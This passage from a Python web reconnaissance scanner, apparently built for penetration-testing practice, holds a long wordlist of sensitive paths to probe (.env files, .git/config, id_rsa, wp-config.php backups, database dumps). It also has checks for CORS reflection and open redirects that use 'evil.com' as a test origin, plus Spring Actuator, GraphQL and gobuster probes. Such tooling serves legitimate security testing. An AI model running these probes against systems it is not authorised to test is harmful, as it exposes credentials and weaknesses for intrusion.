    "/.env.local",
    "/.env.prod",
    "/.git/HEAD",
    "/.git/config",
    "/.gitignore",
    "/.gitlab-ci.yml",
    "/.htaccess",
    "/.well-known",
    "/.well-known/",
    "/.well-known/admin",
    "/.well-known/api",
    "/.well-known/debug",
    "/.well-known/index.html",
    "/.well-known/index.php",
    "/.well-known/login",
    "/.well-known/status",
    "/.well-known/v1",
    "/.well-known/v2",
    "/Gemfile",
    "/Pipfile",
    "/accounts.7z",
    "/accounts.backup",
    "/accounts.bak",
    "/accounts.gz",
    "/accounts.old",
    "/accounts.orig",
    "/accounts.rar",
    "/accounts.save",
    "/accounts.swo",
    "/accounts.swp",
    "/accounts.tar",
    "/accounts.tar.gz",
    "/accounts.zip",
    "/admin",
    "/admin.7z",
    "/admin.backup",
    "/admin.bak",
    "/admin.gz",
    "/admin.old",
    "/admin.orig",
    "/admin.rar",
    "/admin.save",
    "/admin.swo",
    "/admin.swp",
    "/admin.tar",
    "/admin.tar.gz",
    "/admin.zip",
    "/admin/",
    "/admin/admin",
    "/admin/api",
    "/admin/debug",
    "/admin/index.html",
    "/admin/index.php",
    "/admin/login",
    "/admin/status",
    "/admin/v1",
    "/admin/v2",
    "/administrator",
    "/administrator/",
    "/administrator/admin",
    "/administrator/api",
    "/administrator/debug",
    "/administrator/index.html",
    "/administrator/index.php",
    "/administrator/login",
    "/administrator/status",
    "/administrator/v1",
    "/administrator/v2",
    "/api",
    "/api/",
    "/api/admin",
    "/api/admin/",
    "/api/api",
    "/api/auth",
    "/api/auth/",
    "/api/config",
    "/api/config/",
    "/api/debug",
    "/api/debug/",
    "/api/docs",
    "/api/docs/",
    "/api/health",
    "/api/health/",
    "/api/index.html",
    "/api/index.php",
    "/api/login",
    "/api/login/",
    "/api/metrics",
    "/api/metrics/",
    "/api/openapi.json",
    "/api/openapi.json/",
    "/api/status",
    "/api/status/",
    "/api/swagger.json",
    "/api/swagger.json/",
    "/api/token",
    "/api/token/",
    "/api/users",
    "/api/users/",
    "/api/v1",
    "/api/v2",
    "/app.7z",
    "/app.backup",
    "/app.bak",
    "/app.gz",
    "/app.old",
    "/app.orig",
    "/app.rar",
    "/app.save",
    "/app.swo",
    "/app.swp",
    "/app.tar",
    "/app.tar.gz",
    "/app.zip",
    "/assets",
    "/assets/",
    "/assets/admin",
    "/assets/api",
    "/assets/debug",
    "/assets/index.html",
    "/assets/index.php",
    "/assets/login",
    "/assets/status",
    "/assets/v1",
    "/assets/v2",
    "/auth",
    "/auth/",
    "/auth/admin",
    "/auth/api",
    "/auth/debug",
    "/auth/index.html",
    "/auth/index.php",
    "/auth/login",
    "/auth/status",
    "/auth/v1",
    "/auth/v2",
    "/authorized_keys",
    "/backup",
    "/backup.7z",
    "/backup.backup",
    "/backup.bak",
    "/backup.gz",
    "/backup.old",
    "/backup.orig",
    "/backup.rar",
    "/backup.save",
    "/backup.swo",
    "/backup.swp",
    "/backup.tar",
    "/backup.tar.gz",
    "/backup.zip",
    "/backup/",
    "/backup/admin",
    "/backup/api",
    "/backup/debug",
    "/backup/index.html",
    "/backup/index.php",
    "/backup/login",
    "/backup/status",
    "/backup/v1",
    "/backup/v2",
    "/backups",
    "/backups/",
    "/backups/admin",
    "/backups/api",
    "/backups/debug",
    "/backups/index.html",
    "/backups/index.php",
    "/backups/login",
    "/backups/status",
    "/backups/v1",
    "/backups/v2",
    "/cert",
    "/cert/",
    "/cert/admin",
    "/cert/api",
    "/cert/debug",
    "/cert/index.html",
    "/cert/index.php",
    "/cert/login",
    "/cert/status",
    "/cert/v1",
    "/cert/v2",
    "/certs",
    "/certs/",
    "/certs/admin",
    "/certs/api",
    "/certs/debug",
    "/certs/index.html",
    "/certs/index.php",
    "/certs/login",
    "/certs/status",
    "/certs/v1",
    "/certs/v2",
    "/cgi",
    "/cgi-bin",
    "/cgi-bin/",
    "/cgi-bin/admin",
    "/cgi-bin/api",
    "/cgi-bin/debug",
    "/cgi-bin/index.html",
    "/cgi-bin/index.php",
    "/cgi-bin/login",
    "/cgi-bin/status",
    "/cgi-bin/v1",
    "/cgi-bin/v2",
    "/cgi/",
    "/cgi/admin",
    "/cgi/api",
    "/cgi/debug",
    "/cgi/index.html",
    "/cgi/index.php",
    "/cgi/login",
    "/cgi/status",
    "/cgi/v1",
    "/cgi/v2",
    "/clientaccesspolicy.xml",
    "/composer.json",
    "/config",
    "/config.7z",
    "/config.backup",
    "/config.bak",
    "/config.gz",
    "/config.inc.php",
    "/config.old",
    "/config.orig",
    "/config.php",
    "/config.php.bak",
    "/config.php.old",
    "/config.php.save",
    "/config.php~",
    "/config.rar",
    "/config.save",
    "/config.swo",
    "/config.swp",
    "/config.tar",
    "/config.tar.gz",
    "/config.zip",
    "/config/",
    "/config/admin",
    "/config/api",
    "/config/debug",
    "/config/index.html",
    "/config/index.php",
    "/config/login",
    "/config/status",
    "/config/v1",
    "/config/v2",
    "/configs",
    "/configs/",
    "/configs/admin",
    "/configs/api",
    "/configs/debug",
    "/configs/index.html",
    "/configs/index.php",
    "/configs/login",
    "/configs/status",
    "/configs/v1",
    "/configs/v2",
    "/crossdomain.xml",
    "/dashboard",
    "/dashboard/",
    "/dashboard/admin",
    "/dashboard/api",
    "/dashboard/debug",
    "/dashboard/index.html",
    "/dashboard/index.php",
    "/dashboard/login",
    "/dashboard/status",
    "/dashboard/v1",
    "/dashboard/v2",
    "/data",
    "/data/",
    "/data/admin",
    "/data/api",
    "/data/debug",
    "/data/index.html",
    "/data/index.php",
    "/data/login",
    "/data/status",
    "/data/v1",
    "/data/v2",
    "/database",
    "/database.7z",
    "/database.backup",
    "/database.bak",
    "/database.gz",
    "/database.old",
    "/database.orig",
    "/database.rar",
    "/database.save",
    "/database.swo",
    "/database.swp",
    "/database.tar",
    "/database.tar.gz",
    "/database.zip",
    "/database/",
    "/database/admin",
    "/database/api",
    "/database/debug",
    "/database/index.html",
    "/database/index.php",
    "/database/login",
    "/database/status",
    "/database/v1",
    "/database/v2",
    "/db",
    "/db.7z",
    "/db.backup",
    "/db.bak",
    "/db.gz",
    "/db.old",
    "/db.orig",
    "/db.rar",
    "/db.save",
    "/db.sql",
    "/db.swo",
    "/db.swp",
    "/db.tar",
    "/db.tar.gz",
    "/db.zip",
    "/db/",
    "/db/admin",
    "/db/api",
    "/db/debug",
    "/db/index.html",
    "/db/index.php",
    "/db/login",
    "/db/status",
    "/db/v1",
    "/db/v2",
    "/debug.php",
    "/dev",
    "/dev/",
    "/dev/admin",
    "/dev/api",
    "/dev/debug",
    "/dev/index.html",
    "/dev/index.php",
    "/dev/login",
    "/dev/status",
    "/dev/v1",
    "/dev/v2",
    "/docs/admin",
    "/docs/admin/",
    "/docs/auth",
    "/docs/auth/",
    "/docs/config",
    "/docs/config/",
    "/docs/debug",
    "/docs/debug/",
    "/docs/docs",
    "/docs/docs/",
    "/docs/health",
    "/docs/health/",
    "/docs/login",
    "/docs/login/",
    "/docs/metrics",
    "/docs/metrics/",
    "/docs/openapi.json",
    "/docs/openapi.json/",
    "/docs/status",
    "/docs/status/",
    "/docs/swagger.json",
    "/docs/swagger.json/",
    "/docs/token",
    "/docs/token/",
    "/docs/users",
    "/docs/users/",
    "/download",
    "/download/",
    "/download/admin",
    "/download/api",
    "/download/debug",
    "/download/index.html",
    "/download/index.php",
    "/download/login",
    "/download/status",
    "/download/v1",
    "/download/v2",
    "/downloads",
    "/downloads/",
    "/downloads/admin",
    "/downloads/api",
    "/downloads/debug",
    "/downloads/index.html",
    "/downloads/index.php",
    "/downloads/login",
    "/downloads/status",
    "/downloads/v1",
    "/downloads/v2",
    "/dump.sql",
    "/dump.tar.gz",
    "/dump.zip",
    "/export",
    "/export/",
    "/export/admin",
    "/export/api",
    "/export/debug",
    "/export/index.html",
    "/export/index.php",
    "/export/login",
    "/export/status",
    "/export/v1",
    "/export/v2",
    "/files",
    "/files/",
    "/files/admin",
    "/files/api",
    "/files/debug",
    "/files/index.html",
    "/files/index.php",
    "/files/login",
    "/files/status",
    "/files/v1",
    "/files/v2",
    "/git",
    "/git/",
    "/git/admin",
    "/git/api",
    "/git/debug",
    "/git/index.html",
    "/git/index.php",
    "/git/login",
    "/git/status",
    "/git/v1",
    "/git/v2",
    "/graphql/admin",
    "/graphql/admin/",
    "/graphql/auth",
    "/graphql/auth/",
    "/graphql/config",
    "/graphql/config/",
    "/graphql/debug",
    "/graphql/debug/",
    "/graphql/docs",
    "/graphql/docs/",
    "/graphql/health",
    "/graphql/health/",
    "/graphql/login",
    "/graphql/login/",
    "/graphql/metrics",
    "/graphql/metrics/",
    "/graphql/openapi.json",
    "/graphql/openapi.json/",
    "/graphql/status",
    "/graphql/status/",
    "/graphql/swagger.json",
    "/graphql/swagger.json/",
    "/graphql/token",
    "/graphql/token/",
    "/graphql/users",
    "/graphql/users/",
    "/id_rsa",
    "/id_rsa.pub",
    "/import",
    "/import/",
    "/import/admin",
    "/import/api",
    "/import/debug",
    "/import/index.html",
    "/import/index.php",
    "/import/login",
    "/import/status",
    "/import/v1",
    "/import/v2",
    "/include",
    "/include/",
    "/include/admin",
    "/include/api",
    "/include/debug",
    "/include/index.html",
    "/include/index.php",
    "/include/login",
    "/include/status",
    "/include/v1",
    "/include/v2",
    "/includes",
    "/includes/",
    "/includes/admin",
    "/includes/api",
    "/includes/debug",
    "/includes/index.html",
    "/includes/index.php",
    "/includes/login",
    "/includes/status",
    "/includes/v1",
    "/includes/v2",
    "/index.7z",
    "/index.backup",
    "/index.bak",
    "/index.gz",
    "/index.html~",
    "/index.old",
    "/index.orig",
    "/index.php.bak",
    "/index.php.old",
    "/index.php.save",
    "/index.php~",
    "/index.rar",
    "/index.save",
    "/index.swo",
    "/index.swp",
    "/index.tar",
    "/index.tar.gz",
    "/index.zip",
    "/info.php",
    "/internal",
    "/internal/",
    "/internal/admin",
    "/internal/api",
    "/internal/debug",
    "/internal/index.html",
    "/internal/index.php",
    "/internal/login",
    "/internal/status",
    "/internal/v1",
    "/internal/v2",
    "/keys",
    "/keys/",
    "/keys/admin",
    "/keys/api",
    "/keys/debug",
    "/keys/index.html",
    "/keys/index.php",
    "/keys/login",
    "/keys/status",
    "/keys/v1",
    "/keys/v2",
    "/known_hosts",
    "/log",
    "/log/",
    "/log/admin",
    "/log/api",
    "/log/debug",
    "/log/index.html",
    "/log/index.php",
    "/log/login",
    "/log/status",
    "/log/v1",
    "/log/v2",
    "/login",
    "/login/",
    "/login/admin",
    "/login/api",
    "/login/debug",
    "/login/index.html",
    "/login/index.php",
    "/login/login",
    "/login/status",
    "/login/v1",
    "/login/v2",
    "/logs",
    "/logs/",
    "/logs/admin",
    "/logs/api",
    "/logs/debug",
    "/logs/index.html",
    "/logs/index.php",
    "/logs/login",
    "/logs/status",
    "/logs/v1",
    "/logs/v2",
    "/old",
    "/old/",
    "/old/admin",
    "/old/api",
    "/old/debug",
    "/old/index.html",
    "/old/index.php",
    "/old/login",
    "/old/status",
    "/old/v1",
    "/old/v2",
    "/openapi.json",
    "/openapi/admin",
    "/openapi/admin/",
    "/openapi/auth",
    "/openapi/auth/",
    "/openapi/config",
    "/openapi/config/",
    "/openapi/debug",
    "/openapi/debug/",
    "/openapi/docs",
    "/openapi/docs/",
    "/openapi/health",
    "/openapi/health/",
    "/openapi/login",
    "/openapi/login/",
    "/openapi/metrics",
    "/openapi/metrics/",
    "/openapi/openapi.json",
    "/openapi/openapi.json/",
    "/openapi/status",
    "/openapi/status/",
    "/openapi/swagger.json",
    "/openapi/swagger.json/",
    "/openapi/token",
    "/openapi/token/",
    "/openapi/users",
    "/openapi/users/",
    "/package.json",
    "/phpinfo.php",
    "/portal",
    "/portal/",
    "/portal/admin",
    "/portal/api",
    "/portal/debug",
    "/portal/index.html",
    "/portal/index.php",
    "/portal/login",
    "/portal/status",
    "/portal/v1",
    "/portal/v2",
    "/private",
    "/private/",
    "/private/admin",
    "/private/api",
    "/private/debug",
    "/private/index.html",
    "/private/index.php",
    "/private/login",
    "/private/status",
    "/private/v1",
    "/private/v2",
    "/redoc/admin",
    "/redoc/admin/",
    "/redoc/auth",
    "/redoc/auth/",
    "/redoc/config",
    "/redoc/config/",
    "/redoc/debug",
    "/redoc/debug/",
    "/redoc/docs",
    "/redoc/docs/",
    "/redoc/health",
    "/redoc/health/",
    "/redoc/login",
    "/redoc/login/",
    "/redoc/metrics",
    "/redoc/metrics/",
    "/redoc/openapi.json",
    "/redoc/openapi.json/",
    "/redoc/status",
    "/redoc/status/",
    "/redoc/swagger.json",
    "/redoc/swagger.json/",
    "/redoc/token",
    "/redoc/token/",
    "/redoc/users",
    "/redoc/users/",
    "/register",
    "/register/",
    "/register/admin",
    "/register/api",
    "/register/debug",
    "/register/index.html",
    "/register/index.php",
    "/register/login",
    "/register/status",
    "/register/v1",
    "/register/v2",
    "/reports",
    "/reports/",
    "/reports/admin",
    "/reports/api",
    "/reports/debug",
    "/reports/index.html",
    "/reports/index.php",
    "/reports/login",
    "/reports/status",
    "/reports/v1",
    "/reports/v2",
    "/requirements.txt",
    "/rest/admin",
    "/rest/admin/",
    "/rest/auth",
    "/rest/auth/",
    "/rest/config",
    "/rest/config/",
    "/rest/debug",
    "/rest/debug/",
    "/rest/docs",
    "/rest/docs/",
    "/rest/health",
    "/rest/health/",
    "/rest/login",
    "/rest/login/",
    "/rest/metrics",
    "/rest/metrics/",
    "/rest/openapi.json",
    "/rest/openapi.json/",
    "/rest/status",
    "/rest/status/",
    "/rest/swagger.json",
    "/rest/swagger.json/",
    "/rest/token",
    "/rest/token/",
    "/rest/users",
    "/rest/users/",
    "/robots.txt",
    "/secret",
    "/secret/",
    "/secret/admin",
    "/secret/api",
    "/secret/debug",
    "/secret/index.html",
    "/secret/index.php",
    "/secret/login",
    "/secret/status",
    "/secret/v1",
    "/secret/v2",
    "/secrets",
    "/secrets/",
    "/secrets/admin",
    "/secrets/api",
    "/secrets/debug",
    "/secrets/index.html",
    "/secrets/index.php",
    "/secrets/login",
    "/secrets/status",
    "/secrets/v1",
    "/secrets/v2",
    "/server-info",
    "/server-status",
    "/settings.7z",
    "/settings.backup",
    "/settings.bak",
    "/settings.gz",
    "/settings.old",
    "/settings.orig",
    "/settings.php",
    "/settings.py",
    "/settings.rar",
    "/settings.save",
    "/settings.swo",
    "/settings.swp",
    "/settings.tar",
    "/settings.tar.gz",
    "/settings.zip",
    "/signup",
    "/signup/",
    "/signup/admin",
    "/signup/api",
    "/signup/debug",
    "/signup/index.html",
    "/signup/index.php",
    "/signup/login",
    "/signup/status",
    "/signup/v1",
    "/signup/v2",
    "/site.7z",
    "/site.backup",
    "/site.bak",
    "/site.gz",
    "/site.old",
    "/site.orig",
    "/site.rar",
    "/site.save",
    "/site.swo",
    "/site.swp",
    "/site.tar",
    "/site.tar.gz",
    "/site.zip",
    "/sitemap.xml",
    "/sitemap_index.xml",
    "/ssl",
    "/ssl/",
    "/ssl/admin",
    "/ssl/api",
    "/ssl/debug",
    "/ssl/index.html",
    "/ssl/index.php",
    "/ssl/login",
    "/ssl/status",
    "/ssl/v1",
    "/ssl/v2",
    "/staging",
    "/staging/",
    "/staging/admin",
    "/staging/api",
    "/staging/debug",
    "/staging/index.html",
    "/staging/index.php",
    "/staging/login",
    "/staging/status",
    "/staging/v1",
    "/staging/v2",
    "/static",
    "/static/",
    "/static/admin",
    "/static/api",
    "/static/debug",
    "/static/index.html",
    "/static/index.php",
    "/static/login",
    "/static/status",
    "/static/v1",
    "/static/v2",
    "/svn",
    "/svn/",
    "/svn/admin",
    "/svn/api",
    "/svn/debug",
    "/svn/index.html",
    "/svn/index.php",
    "/svn/login",
    "/svn/status",
    "/svn/v1",
    "/svn/v2",
    "/swagger",
    "/swagger.json",
    "/swagger/admin",
    "/swagger/admin/",
    "/swagger/auth",
    "/swagger/auth/",
    "/swagger/config",
    "/swagger/config/",
    "/swagger/debug",
    "/swagger/debug/",
    "/swagger/docs",
    "/swagger/docs/",
    "/swagger/health",
    "/swagger/health/",
    "/swagger/login",
    "/swagger/login/",
    "/swagger/metrics",
    "/swagger/metrics/",
    "/swagger/openapi.json",
    "/swagger/openapi.json/",
    "/swagger/status",
    "/swagger/status/",
    "/swagger/swagger.json",
    "/swagger/swagger.json/",
    "/swagger/token",
    "/swagger/token/",
    "/swagger/users",
    "/swagger/users/",
    "/temp",
    "/temp/",
    "/temp/admin",
    "/temp/api",
    "/temp/debug",
    "/temp/index.html",
    "/temp/index.php",
    "/temp/login",
    "/temp/status",
    "/temp/v1",
    "/temp/v2",
    "/test",
    "/test.php",
    "/test/",
    "/test/admin",
    "/test/api",
    "/test/debug",
    "/test/index.html",
    "/test/index.php",
    "/test/login",
    "/test/status",
    "/test/v1",
    "/test/v2",
    "/tmp",
    "/tmp/",
    "/tmp/admin",
    "/tmp/api",
    "/tmp/debug",
    "/tmp/index.html",
    "/tmp/index.php",
    "/tmp/login",
    "/tmp/status",
    "/tmp/v1",
    "/tmp/v2",
    "/uploads",
    "/uploads/",
    "/uploads/admin",
    "/uploads/api",
    "/uploads/debug",
    "/uploads/index.html",
    "/uploads/index.php",
    "/uploads/login",
    "/uploads/status",
    "/uploads/v1",
    "/uploads/v2",
    "/users.7z",
    "/users.backup",
    "/users.bak",
    "/users.gz",
    "/users.old",
    "/users.orig",
    "/users.rar",
    "/users.save",
    "/users.swo",
    "/users.swp",
    "/users.tar",
    "/users.tar.gz",
    "/users.zip",
    "/v1/admin",
    "/v1/admin/",
    "/v1/auth",
    "/v1/auth/",
    "/v1/config",
    "/v1/config/",
    "/v1/debug",
    "/v1/debug/",
    "/v1/docs",
    "/v1/docs/",
    "/v1/health",
    "/v1/health/",
    "/v1/login",
    "/v1/login/",
    "/v1/metrics",
    "/v1/metrics/",
    "/v1/openapi.json",
    "/v1/openapi.json/",
    "/v1/status",
    "/v1/status/",
    "/v1/swagger.json",
    "/v1/swagger.json/",
    "/v1/token",
    "/v1/token/",
    "/v1/users",
    "/v1/users/",
    "/v2/admin",
    "/v2/admin/",
    "/v2/auth",
    "/v2/auth/",
    "/v2/config",
    "/v2/config/",
    "/v2/debug",
    "/v2/debug/",
    "/v2/docs",
    "/v2/docs/",
    "/v2/health",
    "/v2/health/",
    "/v2/login",
    "/v2/login/",
    "/v2/metrics",
    "/v2/metrics/",
    "/v2/openapi.json",
    "/v2/openapi.json/",
    "/v2/status",
    "/v2/status/",
    "/v2/swagger.json",
    "/v2/swagger.json/",
    "/v2/token",
    "/v2/token/",
    "/v2/users",
    "/v2/users/",
    "/v3/admin",
    "/v3/admin/",
    "/v3/auth",
    "/v3/auth/",
    "/v3/config",
    "/v3/config/",
    "/v3/debug",
    "/v3/debug/",
    "/v3/docs",
    "/v3/docs/",
    "/v3/health",
    "/v3/health/",
    "/v3/login",
    "/v3/login/",
    "/v3/metrics",
    "/v3/metrics/",
    "/v3/openapi.json",
    "/v3/openapi.json/",
    "/v3/status",
    "/v3/status/",
    "/v3/swagger.json",
    "/v3/swagger.json/",
    "/v3/token",
    "/v3/token/",
    "/v3/users",
    "/v3/users/",
    "/web.7z",
    "/web.backup",
    "/web.bak",
    "/web.config",
    "/web.gz",
    "/web.old",
    "/web.orig",
    "/web.rar",
    "/web.save",
    "/web.swo",
    "/web.swp",
    "/web.tar",
    "/web.tar.gz",
    "/web.zip",
    "/wp-config.php",
    "/wp-config.php.bak",
    "/wp-config.php.old",
    "/wp-config.php~",
    "/www.7z",
    "/www.backup",
    "/www.bak",
    "/www.gz",
    "/www.old",
    "/www.orig",
    "/www.rar",
    "/www.save",
    "/www.swo",
    "/www.swp",
    "/www.tar",
    "/www.tar.gz",
    "/www.zip",
    "/yarn.lock",
]

# --------------------------- Data Model ---------------------------

def parse_whatweb_tech(whatweb_out: str) -> List[str]:
    if not whatweb_out or whatweb_out == "__TIMEOUT__":
        return []
    tech = set()
    for line in whatweb_out.splitlines():
        if "]" in line:
            after = line.split("]", 1)[1]
            for tok in after.split(","):
                t = tok.strip()
                if not t:
                    continue
                if t.lower().startswith(("country", "ip", "httpserver")):
                    continue
                tech.add(t)
    return sorted(tech)[:30]

def parse_wafw00f(out: str) -> str:
    if not out:
        return ""
    if out == "__TIMEOUT__":
        return "timeout"
    m = re.search(r"(?i)is behind\s+(.+?)\s*(?:\(|$)", out)
    if m:
        return m.group(1).strip()
    if re.search(r"(?i)no waf detected|doesn't appear to be behind a waf|does not appear to be behind a waf", out):
        return "none"
    return ""


# --------------------------- UDP scanning ---------------------------

def detect_http2_alpn(host: str, port: int, timeout: float = 2.0) -> bool:
    """Return True if the server negotiates h2 via ALPN during TLS handshake."""
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols(["h2", "http/1.1"])
        with socket.create_connection((host, port), timeout=timeout) as raw:
            with ctx.wrap_socket(raw, server_hostname=host) as ssock:
                return ssock.selected_alpn_protocol() == "h2"
    except Exception:
        return False

def detect_http2(host: str, port: int, timeout: float = 2.0) -> bool:
    """Alias for detect_http2_alpn — used by http_analyze()."""
    return detect_http2_alpn(host, port, timeout)

def detect_websocket(resp: bytes) -> str:
    """Check if the response contains a WebSocket upgrade hint.

    Returns endpoint path hint or empty string.
    """
    if not resp:
        return ""
    hdrs = http_headers(resp)
    hl = {k.lower(): v for k, v in hdrs.items()}
    # Server responded with 101 Switching Protocols → WebSocket confirmed
    status = http_status_code(resp)
    if status == "101":
        return "WebSocket upgrade accepted (101)"
    # Upgrade header present
    upgrade = hl.get("upgrade", "").lower()
    if "websocket" in upgrade:
        return "WebSocket upgrade offered"
    # Body contains socket.io or stomp reference
    body = http_body_text(resp).lower()
    if "socket.io" in body:
        return "socket.io WebSocket likely at /socket.io/"
    if "websocket" in body:
        return "WebSocket reference in page"
    return ""

def detect_cors_reflection(host: str, port: int, use_ssl: bool,
                           path: str = "/",
                           vhost: Optional[str] = None) -> str:
    """Test for CORS misconfigurations. Returns a human-readable finding or empty string.

    Checks:
      - Origin reflection (server echoes back the Origin value)
      - Wildcard ACAO (*)
      - Credentials + wildcard (CRITICAL)
      - Null origin accepted
    """
    evil = "https://evil.com"
    checks = [evil, "null"]
    extra_hdrs: Dict[str, str] = {}
    if vhost:
        extra_hdrs["Host"] = vhost

    for origin in checks:
        hdrs_send = dict(extra_hdrs)
        hdrs_send["Origin"] = origin
        resp = http_request_raw(host, port, path, use_ssl,
                                method="GET", timeout=2.0, max_bytes=4096,
                                headers=hdrs_send)
        if not resp:
            continue
        hdrs_recv = http_headers(resp)
        hl = {k.lower(): v for k, v in hdrs_recv.items()}
        acao = hl.get("access-control-allow-origin", "")
        acac = hl.get("access-control-allow-credentials", "").strip().lower()
        if not acao:
            continue
        if acao == "*":
            msg = f"⚡ CORS VULN: ACAO=* (wildcard)"
            if acac == "true":
                msg += " + ACAC=true → credential theft CRITICAL"
            return msg
        if acao == origin:
            msg = f"⚡ CORS VULN: Origin '{origin}' reflected"
            if acac == "true":
                msg += " + ACAC=true → credential theft"
            return msg
        if acao.lower() == "null" or origin == "null":
            return "⚡ CORS VULN: null origin accepted (iframe sandbox bypass)"
    return ""

def detect_jwt_tokens(resp_headers: bytes, body: str) -> List[Dict[str, str]]:
    """Scan response headers and HTML body for JWT tokens.

    Returns up to 5 dicts with 'token' and 'location' keys.
    """
    jwt_re = re.compile(
        r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+"
    )
    found: List[Dict[str, str]] = []
    sources = [
        ("response-header", safe_decode(resp_headers) if resp_headers else ""),
        ("page-body",       body or ""),
    ]
    seen: Set[str] = set()
    for location, src in sources:
        for m in jwt_re.finditer(src):
            tok = m.group(0)[:400]
            if tok not in seen:
                seen.add(tok)
                # Try to decode header to get algorithm
                try:
                    import base64 as _b64
                    hdr_part = tok.split(".")[0]
                    padded = hdr_part + "=" * (4 - len(hdr_part) % 4)
                    hdr_decoded = _b64.urlsafe_b64decode(padded).decode("utf-8", errors="ignore")
                    alg = re.search(r'"alg"\s*:\s*"([^"]+)"', hdr_decoded)
                    alg_str = alg.group(1) if alg else ""
                except Exception:
                    alg_str = ""
                found.append({"token": tok, "location": location, "alg": alg_str})
            if len(found) >= 5:
                return found
    return found

def detect_open_redirect(host: str, port: int, use_ssl: bool,
                         vhost: Optional[str] = None) -> str:
    """Probe common open-redirect parameters with a canary URL.

    Tests /?next=, /?url=, /?redirect=, /?return=, /?to= etc.
    Returns a finding string if an open redirect is confirmed, otherwise empty string.
    """
    canary = "https://evil.com"
    params = [
        f"?next={canary}", f"?url={canary}", f"?redirect={canary}",
        f"?return={canary}", f"?to={canary}", f"?dest={canary}",
        f"?returnUrl={canary}", f"?redirectUrl={canary}",
        f"?redirect_uri={canary}", f"?callback={canary}",
    ]
    extra_hdrs: Dict[str, str] = {}
    if vhost:
        extra_hdrs["Host"] = vhost

    for param in params:
        path = f"/{param}"
        resp = http_request_raw(host, port, path, use_ssl,
                                method="GET", timeout=1.5, max_bytes=4096,
                                headers=extra_hdrs)
        if not resp:
            continue
        code = http_status_code(resp)
        if code not in ("301", "302", "303", "307", "308"):
            continue
        hdrs_recv = http_headers(resp)
        location = hdrs_recv.get("Location", "") or hdrs_recv.get("location", "")
        if canary in location:
            return f"⚡ OPEN REDIRECT: {path} → Location: {location[:80]}"
    return ""

def check_spring_actuator(host: str, port: int, use_ssl: bool,
                          vhost: Optional[str] = None) -> List[str]:
    """Probe Spring Boot Actuator endpoints for unauthenticated access.

    Returns list of accessible endpoint paths.  Actuator paths that return
    200 (especially /env, /heapdump, /configprops) often contain credentials.
    """
    actuator_paths = [
        "/actuator", "/actuator/health", "/actuator/info",
        "/actuator/env", "/actuator/configprops", "/actuator/mappings",
        "/actuator/beans", "/actuator/loggers", "/actuator/metrics",
        "/actuator/heapdump", "/actuator/threaddump", "/actuator/scheduledtasks",
        "/actuator/sessions", "/actuator/shutdown",
        # older Spring Boot 1.x paths
        "/env", "/health", "/info", "/metrics", "/beans", "/mappings",
        "/jolokia", "/jolokia/list",
    ]
    found: List[str] = []
    extra_hdrs: Dict[str, str] = {}
    if vhost:
        extra_hdrs["Host"] = vhost

    for path in actuator_paths:
        if shutdown_flag.is_set():
            break
        resp = http_request_raw(host, port, path, use_ssl,
                                method="GET", timeout=1.2, max_bytes=8000,
                                headers=extra_hdrs)
        if not resp:
            continue
        code = http_status_code(resp)
        if code == "200":
            body = http_body_text(resp)
            # Confirm it's actually an actuator response (has JSON with expected keys)
            if any(kw in body for kw in ('"status"', '"health"', '"beans"', '"env"',
                                          '"mappings"', '"diskSpace"', '"UP"', '"DOWN"')):
                found.append(path)
        if len(found) >= 10:
            break
    return found

def check_graphql(host: str, port: int, use_ssl: bool,
                  vhost: Optional[str] = None) -> str:
    """Probe known GraphQL paths. Returns the first accessible endpoint path, or empty string."""
    paths = ["/graphql", "/api/graphql", "/graphiql", "/playground",
             "/v1/graphql", "/v2/graphql", "/query", "/gql", "/graph"]
    extra_hdrs: Dict[str, str] = {}
    if vhost:
        extra_hdrs["Host"] = vhost

    introspect_body = '{"query":"{__schema{queryType{name}}}"}'
    for path in paths:
        if shutdown_flag.is_set():
            break
        hdrs_send = dict(extra_hdrs)
        hdrs_send["Content-Type"] = "application/json"
        resp = http_request_raw(host, port, path, use_ssl,
                                method="POST", timeout=2.0, max_bytes=16000,
                                headers=hdrs_send)
        if not resp:
            continue
        code = http_status_code(resp)
        if code not in ("200", "201"):
            continue
        body = http_body_text(resp)
        if '"__schema"' in body or '"queryType"' in body or '"data"' in body:
            return path
    return ""




# ── OSCP-compliant extended recon functions ──────────────────────────────────
# All tools below are explicitly allowed (Nmap NSE, Nikto, DirBuster-equiv,
# sslscan) or are passive/manual checks. Nuclei and mass-vuln scanners are
# intentionally excluded. Metasploit is never called here.
# Reference: https://help.offsec.com/hc/en-us/articles/360040165632
# ─────────────────────────────────────────────────────────────────────────────

def run_gobuster_dir(url: str, extensions: str = "php,txt,html,bak,old",
                     timeout: int = 90) -> List[Dict[str, str]]:
    """Run gobuster dir and parse its output.
    DirBuster is explicitly permitted in the OSCP exam guide.
    Returns list of {path, status, size} dicts.
    """
    if not shutil.which("gobuster"):
        return []
    wordlist = WL.get("web_medium", "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt")
    if not os.path.isfile(wordlist):
        # Try harder — any common wordlist will do
        for _wl in ("/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
                    "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
                    "/usr/share/wordlists/dirb/common.txt",
                    "/usr/share/dirb/wordlists/common.txt"):
            if os.path.isfile(_wl):
                wordlist = _wl
                break
        else:
            return []
    cmd = ["gobuster", "dir", "-u", url, "-w", wordlist,
           "-x", extensions, "-t", "30", "-q", "--no-progress",
           "-o", "/dev/stdout"]
    # Self-signed certs on HTTPS targets cause gobuster to abort without -k
    if url.startswith("https://"):
        cmd.append("-k")
    try:
        raw = run_cmd(cmd, timeout=timeout)
    except Exception:
        return []
    results = []
    for line in (raw or "").splitlines():
        # gobuster output: "/path  (Status: 200) [Size: 1234]"
        m = re.match(r"^(/\S*)\s+\(Status:\s*(\d+)\)(?:\s+\[Size:\s*(\d+)\])?", line.strip())
        if m:
            results.append({"path": m.group(1), "status": m.group(2), "size": m.group(3) or ""})
    return results[:100]

def run_sslscan(host: str, port: int) -> str:
    """Run sslscan for TLS protocol/cipher suite analysis.
    sslscan is a standard recon tool, not a mass vulnerability scanner.
    Returns parsed summary lines.
    """
    if shutil.which("sslscan"):
        out = run_cmd(["sslscan", "--no-colour", f"{host}:{port}"], timeout=30)
    elif shutil.which("testssl"):
        out = run_cmd(["testssl", "--color", "0", "--quiet",
